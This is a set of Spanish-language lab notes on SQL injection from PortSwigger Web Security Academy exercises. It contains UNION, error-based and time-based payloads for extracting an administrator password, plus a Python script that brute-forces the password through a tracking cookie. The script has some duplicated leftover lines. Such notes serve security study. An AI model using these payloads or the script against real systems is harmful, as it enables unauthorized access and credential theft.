## SUBSTRING 

```sh
Oracle 	SUBSTR('foobar', 4, 2)
Microsoft 	SUBSTRING('foobar', 4, 2)
PostgreSQL 	SUBSTRING('foobar', 4, 2)
MySQL 	SUBSTRING('foobar', 4, 2)
```

## SQLi - UNION

Lab: SQL injection UNION attack, determining the number of columns returned by the query

```sh
' UNION SELECT NULL, NULL, NULL --
```

Variaciones del Lab UNION:

1. Encontrar columna con valor "String"
2. Retornar data de otras tablas
3. Retornar multiples valores en una sola columna (Combinación del 1 y 2)


Concatenación
```sh
Oracle -  'foo'||'bar' 
Microsoft -  'foo'+'bar' 
PostgreSQL -  'foo'||'bar' 
MySQL - 'foo' 'bar' o CONCAT('foo','bar')
```

## SQLi - BASADO EN ERRORES

Lab: Blind SQL injection with conditional errors

Primero tenemos que probar que el parametro es vulnerable: 

```sh
' || (SELECT '' FROM DUAL) || ' 

ESTE LAB USA UNA BASE DE DATOS DE Oracle
```

Después confirmamos que la tabla USERS existe:

```sh
' || (SELECT '' FROM USERS WHERE ROWNUM =1) || ' 
```

Confirmamos que el usuario "administrator" existe en la tabla USERS

```sh
' || (SELECT '' FROM USERS WHERE username='administrator') || ' 
```

Si ponemos esto no sabríamos 

```sh
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM USERS WHERE username='administrator') || ' 
```

Con esto forzaremos el error con el 1=1 THEN TO_CHAR(1/0), pero primero se ejecutará el FROM y después el CASE por lo que al forzar el error podremos saber si existe el usuario administrador

Si hay INTERNAL SERVER ERROR -> Username administrador existe

Determinamos el largo del password 

```sh
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM USERS WHERE username='administrator' and LENGTH(password)>1) || ' 
```

Acá jugamos con el length del password para saber cual es, en este caso es 20

Encontrar la contraseña de administrator

```sh
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM USERS WHERE username='administrator' and SUBSTR(password,1,1)='a') || ' 
```

Se uso un archivo llamado "fuzzer_labsqlerror.py" para automatizar encontrar la contraseña

```sh
import requests
import string
import urllib.parse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://0abd00b7035027e48112d0c900bc003d.web-security-academy.net/'
payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM USERS WHERE username='administrator' and SUBSTR(password,{},1)='{}') || '"
characters = string.printable
import requests
import string
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://0abd00b7035027e48112d0c900bc003d.web-security-academy.net/'

payload = "'||(SELECT CASE WHEN (SUBSTR(password,{},1)='{}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"

characters = string.ascii_letters + string.digits  # seguro para cookies

password = ""

for i in range(1, 21):
    for char in characters:
        cookie = {
            'TrackingId': 'EjhNt7vlWonGzxs4' + payload.format(i, char)
        }

        r = requests.get(url, cookies=cookie, verify=False)

        if r.status_code == 500:
            password += char
            print(f"[+] Encontrado: {password}")
            break

print("\n[✓] Password final:", password)
```

Lab: Visible error-based SQL injection

Al forzar errores en las solicitudes y que estos errores se puedan visualizar, permite manipular el request con SQLi para ver datos filtrados:

```sh
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

## SQLi BASADO EN TIEMPO

Podemos inferir información a partir del comportamiento de la pagina inyectando código para meter delay a las consultas

```sh
Oracle 		dbms_pipe.receive_message(('a'),10)
Microsoft 	WAITFOR DELAY '0:0:10'
PostgreSQL 	SELECT pg_sleep(10)
MySQL 		SELECT SLEEP(10)
```

SOLUCIÓN: TrackingId=x'||pg_sleep(10)--

Para exfiltrar credenciales se usa lo siguiente:

```sh
' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM USERS)--
```

